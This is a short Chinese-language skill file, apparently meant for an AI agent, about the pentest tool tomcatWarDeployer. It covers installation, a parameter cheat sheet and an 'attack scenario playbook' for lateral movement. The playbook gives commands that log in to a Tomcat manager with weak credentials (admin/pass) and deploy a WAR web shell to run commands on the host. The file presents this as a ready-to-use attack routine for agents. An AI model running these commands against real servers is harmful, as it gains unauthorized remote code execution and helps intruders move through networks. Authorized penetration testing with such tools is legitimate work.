---
name: tomcatwardeployer
description: 渗透工具 skill:tomcatWarDeployer 的安装、参数速查与攻击场景 playbook。当任务涉及 远程服务横向移动 需要调用 tomcatWarDeployer 时使用。
---

# tomcatWarDeployer

- 攻击大类:C31 远程服务横向移动
- 上游仓库:https://github.com/mgeeky/tomcatWarDeployer
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/mgeeky/tomcatWarDeployer && cd tomcatWarDeployer
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python3 tomcatWarDeployer.py -H 10.0.0.5 -p 8080 -U admin -P pass -W shell.war` | Tomcat 部署 |
| `-H host -p port -c 'cmd'` | 命令 |
| `-g` | 生成 WAR |

## 攻击场景 Playbook

### Tomcat 管理后台利用

```bash
python3 tomcatWarDeployer.py -H 10.0.0.5 -U admin -P pass -g
# 弱口令+WAR 部署
```

## 注意事项

mgeeky 出品,Tomcat 部署自动化。
